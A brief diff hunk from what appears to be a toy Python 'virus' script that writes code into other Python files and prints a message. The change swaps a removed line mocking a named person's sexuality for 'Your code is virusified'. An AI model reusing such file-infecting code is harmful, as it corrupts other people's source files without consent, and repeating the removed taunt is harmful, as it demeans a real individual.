@@ -40,7 +40,8 @@ for file in python_files:
             f.writelines(final_code)
 
 def malicious_code():
-    print(" TOMAS IS GAY !!!")
+    print("Your code is virusified")
+
 
 malicious_code()
 
